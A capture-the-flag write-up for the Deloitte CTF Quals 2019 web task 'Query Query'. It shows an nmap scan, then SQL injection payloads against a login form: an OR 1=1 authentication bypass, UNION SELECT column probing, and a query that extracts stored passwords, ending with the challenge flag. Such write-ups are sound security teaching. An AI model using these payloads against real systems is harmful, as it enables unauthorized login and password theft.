---
title: "Deloitte CTF Quals 2019: Query Query 👸🏻"
slug: deloitte-query-query
date: 06/11/2019
---

*Query query on the wall.. Who's the fairest of them all? 👸🏻* was a task
labelled web and worth 120 points. It is a standard SQL injection.

![Task Description](/assets/query-query/intro.png)

Let's start with a quick nmap scan:

```
$ nmap 52.56.149.188
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 15:46 GMT
Nmap scan report for ec2-52-56-149-188.eu-west-2.compute.amazonaws.com (52.56.149.188)
  Host is up (0.0038s latency).
  Not shown: 990 closed ports
  PORT     STATE    SERVICE
  22/tcp   open     ssh
  25/tcp   filtered smtp
  53/tcp   filtered domain
  135/tcp  filtered msrpc
  139/tcp  filtered netbios-ssn
  443/tcp  open     https
  445/tcp  filtered microsoft-ds
  2000/tcp open     cisco-sccp
  5060/tcp open     sip
  8008/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

Just a web application on port 443:

![Web Application](/assets/query-query/web_app.png)

From the title of the challenge, we can imagine that our objective is to
perform an SQL injection. Let's try a very simple payload on the `username`
field of the `/login` page.

![Web Application](/assets/query-query/login.png)

A simple `'` crashes the application, so this field is most likely injectable.

![Web Application](/assets/query-query/crash.png)

Let's try to login as `user`. This particular username may not exist but
it will give us some information on how the application behaves:

```sql
user' OR 1=1 --
```

And we get logged as `TESTIING`.

![TESTIING](/assets/query-query/testiing.png)

*Note: Although it is not accessible via a link or button, a `/logout` route
exists and works.*

Let's try with a username that will most likely not exist:

```sql
does_not_exist' OR 1=1 --
```

We are logged as `TESTIING` again. Maybe the SQL query is very weird and still
manages to get this user. Let's ignore this for now and carry on.

According to the challenge description, the flag is the password of one of the
users stored in the database. Let's see if we can display `TESTIING`'s password.
We are going to use the `UNION SELECT` method, so the first step is to determine
how many columns are queried before our input.

```
whocares' UNION SELECT 1 --
whocares' UNION SELECT 1, 2 --
whocares' UNION SELECT 1, 2, 3 --
```

All these payloads crashes the application.

```sql
whocares' UNION SELECT 1, 2, 3, 4 --
```

This payload does not crash the application and logs us as `2`.

![Logged as 2](/assets/query-query/two.png)

Let's replace the numbers by actual column names. We guess that the `id`
column exists and that the password column is named `password`.

```sql
whocares' UNION SELECT id, password, id, id from users --
```

We are now logged as `monkey28`, which is the password of `TESTIING`.

![Logged as monkey](/assets/query-query/monkey.png)

Let's add a constraint on the password column that matches the flag format:

```sql
whocares' UNION SELECT id, password, id, id from users where password like "dctf%" --
```

And we have our flag!

![The flag](/assets/query-query/flag.png)

Final flag: `dctf{c0m3_0n_3113333n!}`.